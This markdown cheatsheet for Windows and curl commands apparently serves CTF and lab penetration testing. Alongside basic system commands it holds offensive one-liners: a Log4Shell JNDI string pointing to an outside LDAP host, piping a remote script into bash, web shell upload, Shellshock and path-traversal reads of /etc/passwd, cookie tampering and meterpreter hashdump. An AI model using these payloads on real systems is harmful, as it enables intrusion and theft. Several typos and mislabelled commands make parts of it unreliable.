# Windows commands cheatsheet

## Summary
* [Basic system commands](#basic-commands)
* [Networking commands](#networking-commands)
* [Curl](#curl)
  * [Curl logic](#curl-logic)
  * [Change HTTP methods](#change-http-methods)
  * [Send a silend GET request](#send-a-silend-get-request)
  * [Send a POST request](#send-a-post-request)
  * [Set cookie for a request](#set-cookie-for-a-request)
  * [Sending POST data with HTTP headers](#sending-a-post-data-with-http-headers)
  * [Cookie tampering with curl](#cookie-tampering-with-curl)
  * [Upload files](#upload-files)
  * [Run bash script cross site](#run-bash-script-from-local-machine-on-remote-machine)
  * [Download files](#download-files)
  * [Grep details from requests](#grep-details-from-requests)
  * [Test for Shellshock vulnerability](#test-for-shellshock-vulnerability)
  * [Send data as it is](#send-data-as-it-is)
  * [Crawl web paths in robots.txt](#crawl-web-paths-in-robots.txt)
* [Powershell script](#powershell-script)
  * [Find unquoted service paths](#find-files-with-unquoted-service-paths)
  * [See permissions of a file](#see-permissions-of-a-file)
  * [See if user has permission](#see-if-user-has-modify-permissions)

## Basic system commands
```
whoami
whoami /priv
whoami /groups
cd --> change directory
dir --> list directory
dir /a:hd --> list hidden files
dir "test.txt" /s --> find a file
type *filename* --> read file
echo "text" --> text output
net user *username* --> change user password without acknowledge previous password
net view *hostname* --> list computers, services or domains
tasklist --> list all operational tasks
taskkill /PID *1532* /F --> kill a task
iexplore --> run applications
cls --> clear screen
date --> shows date
find *filename* --> find files
hostname --> display host name
runas --> start a program as other users
attrib *filename* --> display file attributes
comp *filename1* *filename2* --> compare file contents
copy || xcopy --> copy files
del || erase --> delete files
mkdir --> create new directory
move --> move
rename --> rename files
rmdir || rd --> delete directories
tree --> display folder structure
run(WIN+R) 'recent' --> files that has been modified recently
hashdump --> dump hash using meterpreter
```

## Networking commands
```
ping *8.8.8.8* --> see if a host is reachable 
nslookup *google.com* --> DNS IP resolution
tracert *8.8.8.8* || tracert *google.com* --> follow the route of an IP address
arp -a --> shows the arp table
route print--> display routing table,portal,interface & metric
ipconfig --> displays all network informations
ipconfig /all --> displays more informations
ipconfig /release --> release IP address
ipconfig /renew --> renew IP address
netstat --> display status of connection
netstat -ant --> display tcp connections
netstat -anu --> display udp connections
netstat -a --> display listening ports & connections
netstat --> display all open IP addresses
pathping.*google.com* --> shows more informations of an IP routes
```

## Curl
### CURL LOGIC
```
Curl 'http://10.10.189.232:8983/solr/admin/cores?foo=$\{jndi:ldap://10.4.64.135:4444\}'
If there is a $ sign in your url, then you should wrap the url with single quotes
Escape out of the {} curly braces with a single backslash character
```
### Change HTTP methods
```
curl -X [methods] [url]
```
### Send a silend GET request
```
curl -s [url]
```
### Send a POST request
```
curl -i [url] --data '[data]'
```
### Set cookie for a request
```
curl -i [url] -b "name:value"
```
### Sending a POST data with HTTP headers
```
curl '[url] -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=[username]&email=[host email]'
```
### Cookie tampering with curl
```
curl [url] -H 'Cookie: logged-in=true; admin=true'
```
### Upload files
```
curl [url] -u [creds:creds] --upload-file shell.php
```
### Run bash script from local machine on remote machine
```
curl [ip]:[port]/[file name] | bash 
```
### Download files
```
curl [url] --output [file]
```
### Grep details from requests
```
curl -s [url] | grep img
```
### Test for Shellshock vulnerability
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.155.108//cgi-bin/test.cgi
```
### Send data as it is
```
curl --path-as-is http://example.com/.././../etc/passwd
```
### Crawl web paths in robots.txt
```
for i in `curl -s http://wekor.thm/robots.txt | grep Disallow | cut -d " " -f2`;do echo $i;curl -I http://wekor.thm$i;echo "---";done
```

## Powershell script
### Find files with unquoted service paths
```
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_PathName -inotmatch ":\\Windows\\" }| select name,pathname
```
### See permissions of a file
```
Get-Acl -Path "C:\projects\openclinic\mariadb\bin\mysqld.exe" | select *
```
### See if user has modify permissions
```
(Get-Acl -Path "C:\projects\openclinic\mariadb\bin\mysqld.exe").Access
Get_Acl C:\projects | select *
```
